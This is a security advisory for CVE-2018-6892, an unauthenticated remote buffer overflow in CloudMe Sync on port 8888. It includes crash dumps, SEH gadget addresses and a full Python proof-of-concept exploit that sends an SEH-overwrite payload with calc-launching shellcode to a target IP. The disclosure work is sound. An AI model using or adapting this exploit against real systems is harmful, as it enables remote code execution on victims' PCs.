@@ -1,0 +1,171 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CLOUDME-SYNC-UNAUTHENTICATED-REMOTE-BUFFER-OVERFLOW.txt
+[+] ISR: Apparition Security          
+[+] SSD Beyond Security Submission: https://blogs.securiteam.com/index.php/archives/3669
+
+
+Vendor:
+=============
+www.cloudme.com
+
+
+Product:
+===========
+CloudMe Sync <= v1.10.9
+
+(CloudMe_1109.exe)
+hash: 0e83351dbf86562a70d1999df7674aa0 
+
+CloudMe is a file storage service operated by CloudMe AB that offers cloud storage, file synchronization and client software.
+It features a blue folder that appears on all devices with the same content, all files are synchronized between devices.
+
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+
+CVE Reference:
+==============
+CVE-2018-6892
+
+
+
+Security Issue:
+================
+Unauthenticated remote attackers that can connect to the "CloudMe Sync" client application listening on port 8888, can send a malicious payload causing
+a Buffer Overflow condition. This will result in an attacker controlling the programs execution flow and allowing arbitrary code execution on the victims PC.
+
+CloudMe Sync client creates a socket listening on TCP Port 8888 (0x22B8)
+
+In Qt5Core:
+
+00564DF1   . C74424 04 B822>MOV DWORD PTR SS:[ESP+4],22B8
+00564DF9   . 890424         MOV DWORD PTR SS:[ESP],EAX
+00564DFC   . FF15 B8738100  CALL DWORD PTR DS:[<&Qt5Network._ZN10QTc>;  Qt5Netwo._ZN10QTcpServer6listenERK12QHostAddresst
+
+
+C:\>netstat -ano | findstr 8888
+TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING       15504
+TCP    [::]:8888              [::]:0                 LISTENING       15504
+
+
+Buffer Overflow:
+================
+EIP register will be overwritten at about 1075 bytes.
+
+EAX 00000001
+ECX 76F698DA msvcrt.76F698DA
+EDX 00350000
+EBX 41414141
+ESP 0028D470
+EBP 41414141
+ESI 41414141
+EDI 41414141
+EIP 41414141
+
+Stack Dump:
+==========
+
+(508.524): Access violation - code c0000005 (first/second chance not available)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
+eax=00000000 ebx=00000000 ecx=41414141 edx=778f353d esi=00000000 edi=00000000
+eip=41414141 esp=00091474 ebp=00091494 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+41414141 ??              ???
+
+Exploitation is very easy as ASLR SafeSEH are all set to false making the exploit portable and able to work across different operating systems.
+We will therefore use Structured Exceptional Handler overwrite for our exploit.
+
+e.g.
+
+6FE6909D  0x6fe6909d : pop ebx # pop esi # ret 0x20 |  {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\victimo\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll)
+00476795  0x00476795 : pop ebx # pop esi # ret 0x20 | startnull {PAGE_EXECUTE_READ} [CloudMe.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\victimo\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe)
+61E7B7F6  0x61e7b7f6 : pop ebx # pop esi # ret 0x20 |  {PAGE_EXECUTE_READ} [Qt5Gui.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.9.0.0 (C:\Users\victimo\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll)
+
+
+0day Exploit POC:
+==============
+import socket,struct
+
+print 'CloudMe Sync v1.10.9'
+print 'Unauthenticated Remote Buffer Overflow 0day'
+print 'Discovery/credits: hyp3rlinx'
+print 'apparition security\n'
+
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+ip=raw_input('[+] CloudMe Target IP> ') 
+
+nseh="\xEB\x06"+"\x90"*2                #JMP
+seh=struct.pack('<L',0x61e7b7f6)        #POP,POP RET 
+junk="A"*2232+nseh+seh+sc+"B"*5600
+payload=junk+nseh+seh+sc
+
+def PwnMe(ip,payload):
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
+    s.connect((ip,8888))
+    s.send(payload)
+    print 'Sending buffer overflow packetz'
+    raw_input()
+
+
+if __name__ == '__main__':
+    PwnMe(ip,payload)
+
+
+
+References:
+============
+https://www.cloudme.com/en/sync#
+https://blogs.securiteam.com/index.php/archives/3669
+
+
+POC Video URL:
+=============
+https://vimeo.com/255280060
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline: 
+=============================
+SSD Vulnerability submission: January 17, 2018
+Would like to acknowledge Beyond Security’s SSD program for the help with co-ordination of this vulnerability.
+More details can be found on their blog at:
+
+https://blogs.securiteam.com/index.php/archives/3669
+February 11, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
